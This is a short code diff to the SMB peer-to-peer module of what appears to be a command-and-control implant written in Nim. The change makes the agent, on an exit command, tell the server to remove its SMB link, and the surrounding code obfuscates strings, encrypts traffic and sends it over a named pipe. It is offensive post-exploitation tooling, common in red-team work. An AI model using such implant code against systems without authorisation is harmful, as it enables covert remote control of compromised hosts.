@@ -909,6 +909,18 @@ proc start*(profile: SmbProfile) =
                     taskingResponse[obf("delegates")] = taskDelegates
                     debug "[DEBUG] SMB P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
                   
+                  # If exit command was received, include edge removal in the response
+                  if shouldExit:
+                    debug "[DEBUG] SMB P2P: Including edge removal notification in response"
+                    taskingResponse[obf("edges")] = %* [
+                      %* {
+                        obf("source"): "",
+                        obf("destination"): profile.callbackUuid,
+                        obf("action"): obf("remove"),
+                        obf("c2_profile"): "smb"
+                      }
+                    ]
+                  
                   debug "[DEBUG] SMB P2P: Sending ", taskResponses.len, " task response(s)"
                   let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
                   discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
